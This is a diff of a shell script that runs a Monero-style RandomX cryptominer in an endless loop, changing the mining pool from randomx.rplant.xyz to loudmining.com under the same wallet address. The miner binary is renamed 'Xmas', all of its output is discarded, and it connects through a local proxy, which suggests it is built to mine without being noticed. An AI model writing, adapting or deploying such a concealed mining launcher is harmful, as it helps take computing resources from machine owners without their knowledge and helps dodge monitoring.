@@ -135,6 +135,6 @@ sleep 2
 
 while true
 do
-./Xmas -a randomx --url randomx.rplant.xyz:7107randomx.rplant.xyz:7107 --user TaBocfhMP3qiuVQNLvq1bPaVeKHfjsanFMkZ66Gb6RAziPMzT6WdXkzgsQVZGh2h2QeWSAzH9GKSPBNQDniEsDUj7gXjF5UkRj.$currentdate --pass webpassword=IhatePopUps -k --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:7777 1>/dev/null 2>&1
+./Xmas -a randomx --url loudmining.com:4205 --user solo:TaBocfhMP3qiuVQNLvq1bPaVeKHfjsanFMkZ66Gb6RAziPMzT6WdXkzgsQVZGh2h2QeWSAzH9GKSPBNQDniEsDUj7gXjF5UkRj --pass @$currentdate -k --verbose --randomx-1gb-pages -t $used_num_of_cores --proxy=127.0.0.1:7777 1>/dev/null 2>&1
 sleep 5
 done
